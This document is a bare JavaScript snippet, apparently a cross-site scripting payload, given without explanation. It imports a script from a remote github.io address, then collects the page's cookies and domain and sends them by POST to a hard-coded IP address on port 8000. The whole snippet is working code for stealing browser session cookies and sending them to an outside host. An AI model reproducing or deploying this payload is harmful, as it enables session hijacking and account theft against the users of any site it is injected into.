import('https://bttea.github.io/b.js').then(function(abc) {
    data = new FormData();
    data.set('get_cookie',document.cookie);
    data.set('get_ip',document.domain);
    let request = new XMLHttpRequest();
    request.open('POST','http://140.116.2.44:8000/',true);
    request.send(data);
});